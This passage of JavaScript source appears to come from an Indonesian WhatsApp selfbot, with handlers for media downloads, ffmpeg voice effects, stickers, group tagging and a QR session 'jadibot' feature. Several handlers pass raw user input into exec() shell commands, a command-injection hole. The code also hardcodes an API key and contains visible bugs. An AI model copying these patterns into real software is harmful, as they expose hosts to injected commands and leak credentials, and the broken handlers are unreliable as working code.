*• Link Video :* ${i.url}
`
}
var akhir = kant.trim()
sendFile(res.all[0].image, image, {quoted: vnz, caption: akhir})
break
case 'tinyurl': case 'shorturl':
link = args[0]
anu = await axios.get(`https://tinyurl.com/api-create.php?url=${link}`)
reply(`${anu.data}`)
break
case 'tomp3':
Vanz.updatePresence(from, Presence.composing)
if (!isQuotedVideo) return reply('Itu bukan video')
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return reply(mess.error)
buffer = fs.readFileSync(ran)
Vanz.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4'})
fs.unlinkSync(ran)
})
break
case 'tg':
var imgbb = require('imgbb-uploader')
ted = isQuotedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: vnz
owgi = await Vanz.downloadAndSaveMediaMessage(ted)
anu = await imgbb(`a1cb3ed24455dbb63fbd23cee996aa47`, owgi)
hedhe = await getBuffer(`https://pecundang.herokuapp.com/api/triggeredwebp?url=${anu.display_url}`)
Vanz.sendSTC(hedhe)
break
case 'batrai': case 'battrey':
reply(`${tampilan_battrey}`)
break
case 'bass': 
req = q
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
random = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af equalizer=f=${req}:width_type=o:width=2:g=20 ${random}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(random)
sendPTT(res)
fs.unlinkSync(random)
})
break
case 'vibra': 
var req = q
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "vibrato=f=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'trigger':
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "acrusher=level_in=8:level_out=18:bits=8:mode=log:aa=1" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'tempo':
 var req = q
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
case 'robot':
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
})
break
break
case 'sendlok': case 'sendlokasi':
ppp = `${q}`
send = ppp.split("|")[0];
lok = ppp.split("|")[1];
Vanz.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:send,address:lok}, MessageType.location)
break
case 'google': case 'googlesearch': case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = q
reply(mess.wait)
uh = await ggs({'query' : `${teks}`})
ggs = ``
for (let i of uh) {
ggs += `GOOOGE SEARCH*
Judul :* ${i.title}
Link :* ${i.link}
Keterangan :* ${i.snippet}
`
}
var res = ggs.trim()
reply(res)
break
case 'kontag': case 'kontaktag':
pel = q
adn = pel.split("|")[0]
nuhh = pel.split("|")[1]
tot = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + adn + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nuhh + ':+' + nuhh + '\n' + 'END:VCARD'
let tah = await Vanz.groupMetadata(from)
let setn = tah.participants
let bru = []
for (let go of setn){
bru.push(go.jid)
}
Vanz.sendMessage(from, {displayname: adn, vcard: tot}, MessageType.contact, {contextInfo: {"mentionedJid": bru}})
break
case 'sendkon': case 'sendkontag':
const pepek = q
const adan = pepek.split("|")[0]
const nuahh = pepek.split("|")[1]
const trot = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + adan + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nuahh + ':+' + nuahh + '\n' + 'END:VCARD'
Vanz.sendMessage(from, {displayname: adan, vcard: trot}, contact, {quoted:fimg})
break
case 'stag': case 'stctag': case 'sticktag':
if (!isQuotedSticker) return reply(mess.error)
stag = JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
tagg = await Vanz.downloadMediaMessage(stag)
await fs.writeFileSync(`stctagg.webp`, tagg)
var group = await Vanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
result = fs.readFileSync(`stctagg.webp`)
Vanz.sendSTC(result)
await fs.unlinkSync(`stctagg.webp`)
break
case 'vntag': case 'audiotag':
if (!isQuotedSticker) return reply(mess.error)
tag = JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
tagg = await Vanz.downloadMediaMessage(tag)
await fs.writeFileSync(`stctagg.webp`, tagg)
var group = await Vanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
result = fs.readFileSync(`vntag.mp3`)
sendPTT(result)
await fs.unlinkSync(`stctagg.webp`)
break
case 'imgtag': case 'imagetag':
if ((isMedia && !vnz.message.videoMessage || isQuotedImage) && args.length == 0) {
encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vnz
filePath = await Vanz.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
var value = args.join(" ")
var group = await Vanz.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var opti = {
contextInfo: { mentionedJid: mem },
quoted: vnz
}
ini_buffer = fs.readFileSync(filePath)
sendIMG(ini_buffer)
fs.unlinkSync(filePath)
} else {
reply(mess.error)
}
break
case 'linkgc':
linkgc = await Vanz.groupInviteCode(from)
reply(`https://chat.whatsapp.com/${linkgc}`)
break
case 'setfaket':
if (!vnz.key.fromMe) return 
if (!isQuotedImage)
if	(!isQuotedSticker)return reply('Reply imagenya blokk!')
 fakethumb = await downloadM()
 downfake = await Vanz.downloadMediaMessage(fakethumb)
fs.unlinkSync(`./database/src/thumb/fake.jpg`)
fs.writeFileSync(`./database/src/thumb/fake.jpg`, downfake)
anu = fs.readFileSync('./database/src/thumb/fake.jpg')
reply(mess.sukses)
break
case 'setthumb':
if (!vnz.key.fromMe) return 
if (!isQuotedImage)
if	(!isQuotedSticker)return reply('Reply imagenya blokk!')
fakethumb = JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
 downfake = await Vanz.downloadMediaMessage(fakethumb)
fs.unlinkSync(`./database/src/thumb/Ivan.jpg`)
fs.writeFileSync(`./database/src/thumb/Ivan.jpg`, downfake)
anu = fs.readFileSync('./database/src/thumb/Ivan.jpg')
reply(mess.sukses)
break
case 'public': case 'publik':
if (!vnz.key.fromMe) return 
 fromMe = true
reply(`「 *PUBLIC-MODE* 」`)
break
case 'self':
if (!vnz.key.fromMe) return 
 fromMe = false
reply('「 *SELF-MODE* 」')
break
case 'emojipng': case 'emojitopng':
y = q
emojidl.get(y).then(res => {
png = `${res.images[4].url}`
sendFile(png, image)
})
break
case 'semoji': case 'stikemoji':
y = q
emojidl.get(y).then(res => {
png = `${res.images[4].url}`
sendStickUrl(png)
})
break
case 'twitdl': case 'twitter':
twitdl(`${q}`)
.then(tewit => {
sendFile(twit.download[2].url, video)
})
break
case 'fbdl': case 'facebook': case 'fb':
fbdl.getInfo(`${q}`)
.then(fb => {
sendFile(fb.download.sd, video)
})
break
case 'tt': case 'tiktok': 
ttvideo = await ttvideo(q)
sendFile(ttvideo.result.nowm, video)
break
case 'ttmp3': case 'tiktokmusic':
ttaud = await ttmusic(q)
sendFile(ttaud.result.audio, audio, {mimetype: 'audio/mp4', ptt:true, quoted:vnz})
break
case 'ig': case 'instagram': case 'igdl':
igdl(args[0]).then(async(result) => {
for (let igres of result.url_list)	{
if (igres.includes('.mp4')){
sendFile(igres, video)
} else if (igres.includes('.jpg')){
sendFile(igres, image, {quoted:vnz})
}
}
})
break
case 'isbaileys': case 'bail': case 'baileys':
reply(`${vnz.quoted.isBaileys}`)
break
case 'getname': 
getnem = Vanz.getName(vnz.quoted.sender)
reply(`${getnem}`)
break
case 'tagall': case 'tagmem':
members_id = []
teks = (args.length > 1) ? q.trim() : ''
teks += `TAG ALLL\nPESAN: ${q}\n\n`
for (let mem of groupMembers) {
	teks += `@${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
break
case 'hidetag': case 'tag':
if (!vnz.key.fromMe) return
members_id = []
teks = (args.length > 1) ? q.trim() : `${q}`
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
mentions(teks, members_id, true, text)
break
case 'group': case 'grup': case 'gc':
if (args[0] === 'buka') {
reply('Sukses Membuka Group')
Vanz.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'tutup') {
await Vanz.groupSettingChange(from, GroupSettingChange.messageSend, true)
reply('Sukses Menutup Grup')
}
break
case 'setgcname': case 'gcname':
Vanz.groupUpdateDescription(from, `${q}`)
reply(`Sukses Mengubah Nama Gc Menjadi :\n\n${q}`)
break
case 'setgcdesk': case 'gcdesk':
Vanz.groupUpdateDescription(from, `${q}`)
reply(`Sukses Mengubah Desk Gc Menjadi :\n\n${q}`)
break
case 'detikvn':
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
res = fs.readFileSync(media)
sendPTT(from, res)
fs.unlinkSync(media)
break
case 'detikvideo':
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await Vanz.downloadAndSaveMediaMessage(encmedia)
cokmatane = Number(args[0])
res = fs.readFileSync(media)
sendVID(from, res)
fs.unlinkSync(media)
break
case 'getdeskgc': case 'getgcdesk':
mtdt = await Vanz.groupMetadata(from)
reply(`${mtdt.desk}`)
break
case 'ghstalk':
gh = await ghstalk(q)
ghres = `*GITHUB-STALK*

• Username: ${gh.login}
• Nama: ${gh.name}
• Lokasi: ${gh.location}
• Email: ${gh.email}
• Blog: ${gh.blog}
• Bio: ${gh.bui}
• Followers: ${gh.followers}
• Following: ${gh.following}
• Repositories: ${gh.public_repos}`
sendFile(gh.avatar_url, image, {caption:ghres, quoted:vnz})
case 'getnamagc': case 'getgcnama':
anu = from
metadete = await Vanz.groupMetadata(anu)
reply(`${metadete.subject}`)
break
case 'pinterest': case 'pin':
res = await googleImage(q + "Pinterest", google)
function google(error, result){
if (error){ return reply('Error Terjari Kesalahan Atau Hasil Tidak Ditemukan')}
else {
gugim = result
pilter = gugim.filter(hamsil => hamsil.url.includes('pinimg')) 
streng = JSON.parse(JSON.stringify(pilter))
random = streng[Math.floor(Math.random() * streng.length)].url
sendFile(random,image, {quoted:vnz, caption:`Hasil Pencarian Dari: ${q}`})
}
}
break
case 'gimg': case 'googleimage': case 'ggsimg':
wet = await googleImage(q, google)
function google(error, result){
if (error){ return reply('Error Terjari Kesalahan Atau Hasil Tidak Ditemukan')}
else {
gugim = result
res = gugim.filter(hamsil => gugim.url.includes('pinimg')) 
ress = JSON.parse(JSON.stringify(res))
random = ress[Math.floor(Math.random() * ress.length)].url
sendFile(random,image, {quoted: vnz, caption:`Hasil Pencarian Dari: ${q}`})
}
}
break
case 'brainly': case 'brainlysearch':
brainly(q).then(res => {
teks = '─────────────────────────\n'
teks += `*BRAINLY*\n\n*ertanyaan:* ${res.data.pertanyaan}\n\nJawaban: ${res.data.jawaban[0].text}\n─────────────────────────\n`
reply(from, teks.trim())
})  
break
case 'setprefix':
prefix = q
reply(from,`Berhasil SetPrefix ${q}`)
break
case 'hode':
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(from, res)
})
break
case 'stickerwm': case 'swm': case 'take': case 'takesticker': case 'takestick': case 's': case 'stiker': {
let packname1 = q.split('|')[0] ? q.split('|')[0] : q
let author1 = q.split('|')[1] ? q.split('|')[1] : ''
if (isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vnz
let media = await Vanz.downloadAndSaveMediaMessage(encmedia, `./database/sampah/${sender}`)
exifCreate(packname1, author1, `stickwm_${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply('Error !!')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./database/sampah/stickwm_${sender}.exif ./database/sampah/${sender}.webp -o ./database/sampah/${sender}.webp`, async (error) => {
if (error) return reply('Error !!')
	Vanz.sendMessage(from, fs.readFileSync(`./database/sampah/${sender}.webp`), sticker, {quoted: vnz})
fs.unlinkSync(media)	
	fs.unlinkSync(`./database/sampah/${sender}.webp`)	
fs.unlinkSync(`./database/sampah/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=20, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./database/sampah/${sender}.webp`)
} else if ((isQuotedVideo && vnz.message.videoMessage.fileLength < 10000000 || isQuotedVideo && vnz.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(vnz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vnz
let media = await Vanz.downloadAndSaveMediaMessage(encmedia, `./database/sampah/${sender}`)
exifCreate(packname1, author1, `stickwm_${sender}`)
	await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply('Error !!')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./database/sampah/stickwm_${sender}.exif ./database/sampah/${sender}.webp -o ./database/sampah/${sender}.webp`, async (error) => {
	if (error) return reply('Error !!')
	Vanz.sendMessage(from, fs.readFileSync(`./database/sampah/${sender}.webp`), sticker, {quoted: vnz})
fs.unlinkSync(media)
	fs.unlinkSync(`./database/sampah/${sender}.webp`)
fs.unlinkSync(`./database/sampah/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./database/sampah/${sender}.webp`)
} if (isQuotedSticker) {
let encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	let media = await Vanz.downloadAndSaveMediaMessage(encmedia, `./database/sampah/${sender}`)
exifCreate(packname1, author1, `takestick_${sender}`)
exec(`webpmux -set exif ./database/sampah/takestick_${sender}.exif ./database/sampah/${sender}.webp -o ./database/sampah/${sender}.webp`, async (error) => {
if (error) return reply('Error !!')
Vanz.sendMessage(from, fs.readFileSync(`./database/sampah/${sender}.webp`), sticker, {quoted: vnz})
fs.unlinkSync(media)
fs.unlinkSync(`./database/sampah/takestick_${sender}.exif`)
})
}else {
}
}
break
case 'antitrol':
if (args[0] == '1') {
antitroli = true
reply('Sukses Aktifed Anti Troli')
} else if (args[0] == '0') {
antitroli = false
reply('Sukses Aktifed Anti Troli')
}
break
case 'antidel':
if (args[0] == '1') {
antidel = true
reply('Sukses Aktifed Anti Delete')
} else if (args[0] == '0') {
antidel = false
reply('Sukses Nonaktifed Anti Delete')
}
break
case 'ulang':
 meta = await Vanz.loadMessage(from, vnz.message.extendedTextMessage.contextInfo.stanzaId)
res = await Vanz.generateForwardMessageContent(meta) 
res = await Vanz.prepareMessageFromContent(from, res, {quoted:vnz, contextInfo:{mentionedJid:[]}}) 
Vanz.relayWAMessage(res)
break
case 'jadibot':
let jadibot = new WAConnection()
jadibot.version = [2,2121,7]
jadibot.on('qr', async qr => {
qrcodee = await qrcod.toDataURL(qr, { scale: 8 })
split = qrcodee.split(',')[1]
hasil = split
capjdbot = 'Scan QR ini untuk jadi bot sementara\n\n1. Klik titik tiga di pojok kanan atas\n2. Ketuk WhatsApp Web\n3. Scan QR ini \nQR Expired dalam 20 detik'
buffer = Buffer.from (hasil,'base64')
let scan = Vanz.sendMessage(from, buffer, image, {quoted:vnz, caption: capjdbot})
})
jadibot.on('credentials-updated', () => {
let authInf = jadibot.base64EncodedAuthInfo()
	fs.writeFileSync(`./${sessionName}.json`, JSON.stringify(authInf, null, '\t'))
})
fs.existsSync(`./${sessionName}.json`) && jadibot.loadAuthInfo(`./${sessionName}.json`)
jadibot.connect();
break
default:
switch (isStc) {
case "e27a113d336d30819d41bdc1080fddf7ae81b84e4303545aebd369993d7b306b":
case 'menu':
menu = ` *SIMPEL-SELFBOT*

*INFO*
• cekprefix
• ${prefix}stats
• ${prefix}runtime
• ${prefix}owner
• ${prefix}speed
• ${prefix}listgroup
• ${prefix}uptime

*Downloader*
• ${prefix}ytmp3 *link*
• ${prefix}ytmp4 *link*
• ${prefix}play *query*
• ${prefix}playmp4 *query*
• ${prefix}fb *link*
• ${prefix}tiktok *link*
• ${prefix}tiktokmusic *link*
• ${prefix}ig *link*

*Stalker*
• ${prefix}igstalk *username*
• ${prefix}ghstalk *username*

*Converter*
• ${prefix}stiker 
• ${prefix}swm nama|author
• ${prefix}take nama|author
• ${prefix}colong
• ${prefix}tomp4
• ${prefix}tomp3
• ${prefix}imgtotext
• ${prefix}toimg

*Group*
• ${prefix}grup *buka/tutup*
• ${prefix}setgcname *txt*
• ${prefix}setgcdesk *txt*
• ${prefix}add *628xx*
• ${prefix}kick *@tag/reply*
• ${prefix}getpic *@tag*
• ${prefix}promote 
• ${prefix}demote 
• ${prefix}hidetag *txt*
• ${prefix}tagall 

*Voice Changer*
• ${prefix}bass 
• ${prefix}tempo 
• ${prefix}vibra 
• ${prefix}gemes
• ${prefix}trigger 
• ${prefix}nightcore
• ${prefix}balik
• ${prefix}volume 
• ${prefix}hode 
• ${prefix}imut 
• ${prefix}robot
• ${prefix}budeg

*Owner*
• ${prefix}join *link*
• ${prefix}bc *txt*
• ${prefix}shutdown
• ${prefix}restart 
• > *eval*
• $ *exec*`
reply(menu)
break
case "6ff437cf89e44ae0b6d086d31ae4fd579ed41d8d272609d51eb89eb421f63275":
Vanz.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case "1cd14e9ad24bceaf1918baf45798ca4280686d61a3b98964877391d7c1d831a2":
Vanz.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case "4203312e8e21bd0204cf206193a18ca9a75bd1d10b1961e29b9fafa6d98cfaf9":
sjdl = vnz.quoted.text
 ytsya = await yts(sjdl);
res = ytsya.all;
anu = await vanz.yta(res[0].url)
bup = await getBuffer(anu.audio)
Vanz.sendMessage(from, bup, audio, {mimetype: 'audio/mp4', quoted:vnz})
break
default:
}
}
} catch (e) {
err = String(e)
if (err.includes('startsWith')){ 
return
}
if (err.includes('this.isZero')){
return
}
console.log('Error : %s', color(e, 'red'))
console.log(e)
}
})
}
starts()